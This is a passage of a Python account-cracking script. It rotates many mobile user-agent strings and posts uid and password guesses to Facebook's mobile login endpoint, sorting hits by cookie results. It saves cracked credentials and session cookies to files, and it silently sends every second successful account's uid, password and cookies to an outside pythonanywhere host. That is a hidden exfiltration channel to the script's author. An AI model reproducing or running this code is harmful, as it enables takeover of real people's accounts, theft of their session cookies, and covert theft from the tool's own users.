"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]",
"Mozilla/5.0 (Linux; Android 13; 22041219NY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 23053RN02A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]",
"Mozilla/5.0 (Linux; Android 13; 22041219NY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 23053RN02A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi Redmi Note 1 Build/N2G48H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 OPT/1.10.33",
"Mozilla/5.0 (Linux; Android 11; 21061119AG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/313.0.0.7.110;]",
"Mozilla/5.0 (Linux; Android 13; 22011119UY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.2 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; 2210132C Build/UKQ1.230705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;]",
"Mozilla/5.0 (Linux; Android 13; 2210132C Build/TKQ1.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi 7 Pro Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/38.0.2254.134507",
"Mozilla/5.0 (Linux; Android 9; Redmi 8 Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/297.0.0.36.116;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Build/LMY47O.H18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 [FBAN/FBIOS;FBAV/90.0.0.51.69;FBBV/56254015;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/10.2;FBSS/2;FBCR/1&1;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.0.0.20.111;]",
"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/244.0.0.6.117;]"
"Mozilla/5.0 (Linux; Android 11; M2004J19C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/288.0.0.11.115;]",
"Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/309.0.0.14.114;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/65.0.0.42.81;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 23106RN0DA Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.29.119;]",
"Mozilla/5.0 (Linux; Android 13; 23106RN0DA Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/443.0.0.23.229;]",
"Mozilla/5.0 (Linux; Android 10.0.1; Redmi 11X Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/277.0.0.41.126;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 11X Build/QCOS30.85-18-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/294.6.0.39.118;]",
"Mozilla/5.0 (Linux; Android 4.4.4; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13;Redmi 5 pro Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/299.0.0.51.236;]",
"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.87 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/185.0.0.6.118;]",
"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/327.1.0.9.118;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/279.0.0.43.120;]",
"Mozilla/5.0 (Linux; Android 11; M2004J19C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/288.0.0.11.115;]",
"Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/313.0.0.15.119;]",
"Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/334.0.0.32.119;]",
"Mozilla/5.0 (Linux; U; Android 12; fr-fr; Xiaomi 11 Lite 5G NE Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn",
"Mozilla/5.0 (Linux; Android 11; 2109119DI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.8.7",
"Mozilla/5.0 (Linux; Android 8.1.1; Redmi 11 Lite Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.565575.109 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13;Xiaomi 10 Pro Build/MBFMIEK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5060.134 Mobile Safari/537.36 EdgA/104.0.1264.77",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J3119) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200H Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A115F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-J3109 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111M Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.07.4.5054",
"Mozilla/5.0 (Linux; Android 8.1.0; GT-N7000B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-N970F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/268.0.0.15.118;]",
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
                "Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A730F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Mobile Safari/537.36 [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
            ])
            ua = random.choice(uas)
            Session = requests.Session()
            p_fb = Session.get("https://touch.facebook.com").text
            lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
            m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
            li = re.search('name="li" value="(.*?)"', str(p_fb)).group(1)
            data = {
                "lsd": lsd,
                "jazoest": jazoest,
                "m_ts": m_ts,
                "li": li,
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pw,
                "login": "Log In",
            }
            headers = {
            'Host': 'm.facebook.com',
            'method': 'POST',
            'path': '/login/Device-based/login/async/',
            'scheme': 'https',
            'content-length': '294',
            'Accept-Encoding': 'gzip',
            'content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'dpr': '1.75',
            'viewport-width': '980',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '""',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-full-version-list': '',
            'sec-ch-prefers-color-scheme': 'light',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://m.facebook.com/login/device-based/login/async/"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        break
                    else:
                        bkas.append(cid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{cid}|{pw}|{coki}")
                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                           oks.append(cid)
                           break
                else:
                    break
            elif 'checkpoint' in response:
                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                uid = "1000"+coki[0:11]
                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        #print({error})
        pass

os.system("clear")
Process()
